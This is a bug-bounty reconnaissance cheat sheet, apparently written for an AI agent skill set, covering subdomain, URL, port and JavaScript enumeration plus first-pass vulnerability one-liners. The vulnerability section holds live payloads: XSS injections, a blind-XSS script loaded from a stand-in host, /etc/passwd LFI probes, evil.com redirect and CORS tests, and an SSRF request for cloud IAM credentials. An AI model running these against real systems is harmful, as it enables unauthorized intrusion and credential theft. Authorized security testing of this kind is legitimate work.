# Recon One-Liner Arsenal

Copy-paste, battle-tested recon + first-pass vuln-hunt one-liners. This complements
the methodology in `SKILL.md` — the skill tells you *what phase you're in and why*;
this file gives you the *exact command* for that phase. Distilled from a
community recon checklist (coffinxp/LostSec lineage) + local fixes.

> Authorized targets only. Confirm scope (`python3 tools/scope_checker.py --asset <asset>`)
> before any active probe. Rate-limit on production. Never DoS.

---

## 1. Subdomain Enumeration

### Automated (multi-source)
```bash
subfinder -d example.com -all -recursive -o subfinder.txt
assetfinder --subs-only example.com > assetfinder.txt
findomain -t example.com | tee findomain.txt

amass enum -passive -d example.com | cut -d']' -f2 | awk '{print $1}' | sort -u > amass.txt
amass enum -active  -d example.com | cut -d']' -f2 | awk '{print $1}' | sort -u >> amass.txt
```
Configure API keys for each source (`~/.config/subfinder/config.yaml`) for full coverage.

### Passive / public sources (no tool install)
```bash
# crt.sh certificate transparency
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > crtsh.txt

# Wayback host extraction
curl -s "http://web.archive.org/cdx/search/cdx?url=*.example.com/*&output=text&fl=original&collapse=urlkey" \
  | sed -e 's_https*://__' -e 's_/.*__' -e 's_:.*__' -e 's/^www\.//' | sort -u > wayback-hosts.txt

# VirusTotal siblings (needs api key)
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?apikey=<API_KEY>&domain=example.com" | jq -r '.domain_siblings[]?' > virustotal.txt
```

### GitHub subdomain scraping
```bash
github-subdomains -d example.com -t <github_token>   # gwen001/github-subdomains
```

### Merge + dedupe
```bash
cat *.txt | sort -u > final.txt
```

### Permutation + DNS resolution (alterx + dnsx)
```bash
subfinder -d example.com | alterx | dnsx
echo example.com | alterx -enrich | dnsx
echo example.com | alterx -pp word=/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | dnsx
```

### Brute-force (ffuf)
```bash
ffuf -u "https://FUZZ.example.com" -w subdomains.txt -mc 200,301,302
```

---

## 2. IP / ASN / Infrastructure Discovery

```bash
# ASN → IPs → resolve
asnmap -d example.com | dnsx -silent -resp-only

# Amass intel — org footprint
amass intel -org "ExampleCorp"
amass intel -active -cidr 159.69.129.82/32
amass intel -active -asn <ASN>

# IPs from public APIs (backend / origin behind CDN)
curl -s "https://www.virustotal.com/vtapi/v2/domain/report?domain=example.com&apikey=<API_KEY>" | jq -r '.. | .ip_address? // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
curl -s "https://otx.alienvault.com/api/v1/indicators/hostname/example.com/url_list?limit=500&page=1" | jq -r '.url_list[]?.result?.urlworker?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'
curl -s "https://urlscan.io/api/v1/search/?q=domain:example.com&size=10000" | jq -r '.results[]?.page?.ip // empty' | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}'

# Shodan SSL-CN pivot → live probe
shodan search Ssl.cert.subject.CN:"example.com" 200 --fields ip_str | httpx -sc -title -server -td
```

---

## 3. Live Hosts + Visual Recon

```bash
# Probe across common + alt ports
cat subdomains.txt | httpx -ports 80,443,8080,8000,8888 -threads 200 -sc -title -td > subdomains_alive.txt

# Screenshot every live host (spot login/admin/staging at a glance)
cat hosts.txt | aquatone -ports 80,81,443,591,2082,2087,2095,2096,3000,8000,8001,8008,8080,8083,8443,8834,8888
```

---

## 4. URL Collection + Parameter Extraction

```bash
# Active crawl
katana -u livesubdomains.txt -d 3 -jc -kf all -o urls.txt
cat urls.txt | hakrawler -u >> urls.txt

# Passive
cat livesubdomains.txt | gau | sort -u >> urls.txt
echo example.com | gau --mc 200 | urldedupe >> urls.txt

# Keep only parameterized URLs (injection candidates)
cat urls.txt | grep -E '\?[^=]+=.+$' | urldedupe | tee params.txt

# gf classification
cat urls.txt | gf sqli   | tee sqli.txt
cat urls.txt | gf xss    | tee xss.txt
cat urls.txt | gf ssrf   | tee ssrf.txt
cat urls.txt | gf lfi    | tee lfi.txt
cat urls.txt | gf redirect | tee redirect.txt
```

---

## 5. Sensitive Files + Hidden Params + Dir Brute

```bash
# Sensitive file extensions in collected URLs
cat allurls.txt | grep -E "\.(xls|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|db|backup|yml|gz|config|csv|yaml|env|ini|conf|pem|key|crt|sql|sqlite3)$"

# Hidden parameters (Arjun)
arjun -u https://site.com/endpoint.php -oT arjun.txt -m GET,POST -t 10 --rate-limit 10 --passive
arjun -u https://site.com/endpoint.php -oT arjun.txt -m GET,POST -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10

# Directory / file brute
dirsearch -u https://example.com -e php,html,js,txt,bak,zip,old,conf,log,json,xml,yml,ini,env --random-agent -R 3 -t 20 --exclude-status=404 --follow-redirects
ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,403,404,429,500-503 -recursion -recursion-depth 2 -e .html,.php,.txt,.js,.bak,.old,.log,.json,.xml,.config,.env -ac -c -t 100
```

---

## 6. JavaScript Analysis (endpoints + secrets)

```bash
# JS files → exposures via nuclei
echo example.com | katana -d 3 | grep -E "\.js$" | nuclei -t ~/nuclei-templates/http/exposures/ -c 30

# Grep JS for secrets
cat jsfiles.txt | grep -riE "aws_access_key|aws_secret|api[_-]?key|secret|token|password|firebase|jdbc|oauth_token|\.env|BEGIN RSA"

# Content-type filter to real JS
echo example.com | gau | grep '\.js$' | httpx -sc -mc 200 -content-type | grep 'application/javascript'
```

---

## 7. Nuclei (automated scanning)

```bash
nuclei -u https://target.com -bs 50 -c 30
nuclei -l live_domains.txt -bs 50 -c 30 -severity critical,high,medium
```

---

## 8. Network-Level Recon

```bash
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan
masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt
```

---

## 9. WordPress

```bash
wpscan --url https://site.com --disable-tls-checks --api-token <token> -e at -e ap -e u --plugins-detection aggressive --force
```

---

## 10. First-Pass Vuln Hunts (one-liners)

> These are *lead generators*, not proof. Every hit must be manually confirmed and
> pass the 7-Question Gate (`triage-validation` skill) before it's a finding.

### SQLi lead detection
```bash
# Tech fingerprint for SQL-prone stacks
subfinder -dL subdomains.txt -all -silent | httpx -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
# SQL-shaped endpoints
echo http://site.com | gau | uro | grep -E "\.php|\.asp|\.aspx|\.jspx|\.jsp" | grep -E '\?[^=]+=.+$'
```

### XSS
```bash
echo "target.com" | gau | gf xss | uro | httpx -silent | Gxss -p Rxss | dalfox pipe
echo "example.com" | gau | qsreplace '"><svg onload=confirm(1)>' | httpx -silent -mr 'onload=confirm(1)'
subfinder -d example.com | gau | bxss -payload '"><script src=https://YOUR.xss.report></script>' -header "X-Forwarded-For"
```

### LFI
```bash
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u \
  | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
gau target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" | grep -q "root:x" && echo "VULN: %"'
```

### CORS
```bash
curl -s -H "Origin: https://evil.com" -I https://domain.com/wp-json/ | grep -i "access-control-allow-origin\|access-control-allow-credentials"
python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=test"
```

### SSRF
```bash
# Prone params + integration points
cat urls.txt | grep -E 'url=|uri=|redirect=|next=|data=|path=|dest=|proxy=|file=|img=|out=|continue=' | sort -u
cat urls.txt | grep -iE 'webhook|callback|upload|fetch|import|api' | sort -u
# Cloud metadata probe (after DNS callback confirms)
curl "https://target.com/api?endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Filter bypass IP formats: http://127.1  http://[::1]/  http://0x7f000001  http://017700000001
```

### Open Redirect
```bash
cat final.txt | gf redirect | uro | sort -u \
  | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

### Subdomain Takeover
```bash
subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
# verify candidates against github.com/EdOverflow/can-i-take-over-xyz fingerprints
```

### Exposed .git
```bash
cat domains.txt | httpx -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
```

---

## Cross-references

- Confirm/kill leads → **triage-validation** skill (7-Question Gate).
- Payloads + bypass tables → **security-arsenal** skill.
- Per-class exploit depth → **web2-vuln-classes** skill.
- Toolkit scripts that wrap these → `tools/recon_engine.sh`, `tools/vuln_scanner.sh`,
  `tools/param_discovery.sh`, `tools/secrets_hunter.sh`, `tools/takeover_scanner.sh`.

Useful payload/pattern repos: `github.com/coffinxp/payloads`,
`github.com/coffinxp/GFpattren`, `github.com/swisskyrepo/SSRFmap`,
`github.com/EdOverflow/can-i-take-over-xyz`.
